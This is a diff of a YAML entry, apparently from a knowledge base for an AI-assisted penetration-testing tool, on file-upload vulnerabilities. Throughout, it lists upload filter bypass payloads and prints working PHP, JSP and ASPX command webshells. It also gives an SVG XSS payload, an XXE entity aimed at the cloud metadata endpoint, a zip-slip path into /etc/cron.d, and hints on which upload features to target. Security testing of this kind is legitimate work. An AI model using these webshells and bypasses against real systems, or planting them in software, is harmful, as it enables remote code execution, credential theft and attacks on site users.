@@ -1,24 +1,105 @@
 id: FILE_UPLOAD
-name: Unrestricted File Upload
+name: File Upload Vulnerabilities — Comprehensive
 cwe:
 - CWE-434
 owasp: A04:2021 Insecure Design
-severity_range: High - Critical
-description: Application allows uploading files without proper validation of type, content, or storage location, potentially
-  leading to RCE.
+severity_range: Medium - Critical
+description: Insecure file uploads enable RCE (webshell), XSS (HTML), SSRF (SVG/PDF), DoS (zip bomb), and bypass via extension/content-type/magic-byte
+  tricks.
 detection:
   strategy:
-  - 1. Upload a file with web shell extension (.php, .jsp, .aspx, .py)
-  - '2. If blocked, try double extension: shell.php.jpg'
-  - '3. Try null byte: shell.php%00.jpg'
-  - 4. Try Content-Type manipulation (image/jpeg with PHP content)
-  - '5. Try case variation: shell.PhP, shell.pHp'
-  - 6. Upload SVG with XSS payload
-  - 7. Upload HTML file for stored XSS
-  - 8. Upload .htaccess to change file handling (Apache)
-  - 9. Test file overwrite (upload with path traversal in filename)
-  - 10. Check if uploaded files are served with Content-Disposition or directly executed
-evidence_needed: Uploaded web shell accessible and executing server-side code, or uploaded file causing XSS
+  - 1. Find all file upload endpoints (profile picture, attachments, document upload)
+  - 2. Try uploading a webshell with the expected extension (.jpg.php, etc.)
+  - 3. Test bypasses for each validation layer (extension, MIME, magic bytes, content)
+  - 4. Identify where uploaded files are stored and how they're served
+  - 5. Test if uploaded files can be executed (PHP/JSP/ASP in web root)
+  bypass_techniques:
+    extension_blacklist:
+      description: Server blocks .php but allows .phtml, .php3, .php4, .pht, .phar.
+      payloads:
+      - .phtml
+      - .php3
+      - .php4
+      - .php5
+      - .phar
+      - .pht
+      - .php7
+    double_extension:
+      description: Server checks last extension only.
+      payloads:
+      - shell.php.jpg
+      - shell.jpg.php (Apache mod_mime)
+    null_byte:
+      description: Older PHP truncates at null byte.
+      payloads:
+      - shell.php%00.jpg
+    case_variation:
+      description: Server checks lowercase only.
+      payloads:
+      - shell.PHP
+      - shell.pHp
+      - shell.PhP
+    mime_type_spoofing:
+      description: 'Send Content-Type: image/jpeg with PHP content.'
+    magic_byte_spoofing:
+      description: Add image header bytes to PHP file (GIF89a; <?php ... ?>).
+      payloads:
+      - GIF89a;\n<?php system($_GET['c']); ?>
+    trailing_dot:
+      description: Windows strips trailing dots.
+      payloads:
+      - shell.php.
+    alternate_data_stream:
+      description: Windows ADS via colon.
+      payloads:
+      - shell.php::$DATA
+    filename_traversal:
+      description: ../ in filename writes outside intended dir.
+      payloads:
+      - ../../../var/www/shell.php
+    polyglot_files:
+      description: File valid as both image AND executable script.
+      payloads:
+      - GIF/PHP polyglot
+      - PDF/JS polyglot
+    content_extension_mismatch:
+      description: Upload .jpg with PHP content — sometimes served as PHP based on actual content.
+    race_condition:
+      description: Upload + execute before security scan completes.
+exploitation:
+  php_webshell: "<?php\n  if (isset($_GET['cmd'])) { system($_GET['cmd']); }\n?>"
+  jsp_webshell: '<%@ page import="java.util.*,java.io.*" %>
+
+    <% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); ... %>'
+  aspx_webshell: '<%@ Page Language="C#" %>
+
+    <% System.Diagnostics.Process.Start(Request["cmd"]); %>'
+  svg_xss: "<?xml version=\"1.0\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <script>alert(document.domain)</script>\n\
+    </svg>"
+  svg_ssrf_xxe: '<?xml version="1.0"?>
+
+    <!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+
+    <svg>...&xxe;...</svg>'
+  zip_bomb: 42.zip — 42KB ZIP that expands to 4.5PB
+  zip_slip: Archive with ../../../etc/cron.d/evil filename
+post_upload_checks:
+- 'Find storage location: check response, common paths (/uploads, /files, /media, /static)'
+- Check if files served from web root with executable extensions
+- Try accessing uploaded file directly via predicted URL
+- Some apps process uploaded files (resize images, convert PDFs) — exploit the processor
+ai_research_hints:
+- File processing features (image resize, PDF conversion, antivirus scan) are high-yield targets
+- Cloud upload buckets sometimes have weaker validation than the API layer
+- Avatar/profile picture uploads frequently have less validation than 'serious' file upload features
+- 'Look for processor-based RCE: ImageTragick, GhostScript, FFmpeg, Bento4'
+- JSP/ASPX upload bypasses are less commonly patched than PHP
+- Webshell with .phar extension often missed by blacklists
+tools:
+- Upload Scanner Burp ext
+- fuxploider
+- PayloadsAllTheThings upload payloads
 references:
-- https://portswigger.net/web-security/file-upload
+- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+- https://book.hacktricks.xyz/pentesting-web/file-upload
